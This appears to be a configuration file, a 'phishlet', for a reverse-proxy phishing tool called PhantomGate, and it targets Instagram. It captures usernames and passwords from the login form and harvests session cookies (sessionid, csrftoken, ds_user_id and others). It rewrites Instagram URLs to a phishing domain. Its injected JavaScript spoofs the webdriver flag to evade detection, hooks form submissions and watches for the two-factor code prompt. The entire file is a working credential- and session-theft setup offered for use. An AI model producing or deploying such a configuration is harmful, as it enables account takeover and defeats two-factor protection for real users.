name: Instagram
author: PhantomGate
version: 2.0.0
description: Instagram authentication - Pixel-perfect replica

auth:
  domains:
    - www.instagram.com
    - instagram.com
    - api.instagram.com
  
  login:
    domain: www.instagram.com
    path: /accounts/login
    username:
      selector: "input[name='username']"
      capture: true
    password:
      selector: "input[name='password']"
      capture: true
  
  tokens:
    cookies:
      - name: ds_user_id
        regex: ".*"
      - name: sessionid
        regex: ".*"
      - name: csrftoken
        regex: ".*"
      - name: rur
        regex: ".*"
      - name: mid
        regex: ".*"
      - name: ig_did
        regex: ".*"
      - name: ig_nrcb
        regex: ".*"
      - name: X-IG-App-ID
        regex: ".*"

proxy:
  hosts:
    - domain: www.instagram.com
      inject: true
    - domain: instagram.com
      inject: true
  
  sub_filters:
    - domain: www.instagram.com
      search: "https://www.instagram.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    // PhantomGate Injection - Instagram
    (function() {
      'use strict';
      
      // Override navigator properties
      Object.defineProperty(navigator, 'webdriver', {get: () => false});
      
      // Capture form submissions
      document.addEventListener('submit', function(e) {
        var form = e.target;
        var username = form.querySelector('input[name="username"]');
        var password = form.querySelector('input[name="password"]');
        if (username && password) {
          console.log('[PhantomGate] Instagram credentials captured');
        }
      }, true);
      
      // Monitor for 2FA prompt
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.addedNodes.length) {
            var node = mutation.addedNodes[0];
            if (node.nodeType === 1) {
              var otp = node.querySelector('input[name="verificationCode"]');
              if (otp) {
                console.log('[PhantomGate] 2FA prompt detected');
              }
            }
          }
        });
      });
      
      observer.observe(document.body, {childList: true, subtree: true});
    })();
